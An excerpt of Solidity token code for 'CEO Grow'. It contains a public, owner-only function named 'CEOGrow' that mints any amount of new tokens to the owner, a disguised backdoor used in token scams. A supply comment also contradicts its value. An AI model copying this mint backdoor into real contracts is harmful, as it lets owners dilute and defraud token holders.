...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function CEOGrow(uint256 amount) public onlyOwner {
    _CEOGrow(msg.sender, amount);
    }
    ...
    function _CEOGrow(address account, uint256 amount) internal virtual {
...
contract CEOGrow is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("CEO Grow", "CEOGrow") {
        _CEOGrow(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}
...
contract BEP20 is Context, IERC20, Ownable {
    ...
    string private _name = "CEOGrow";
    string private _symbol = "CEOGrow";
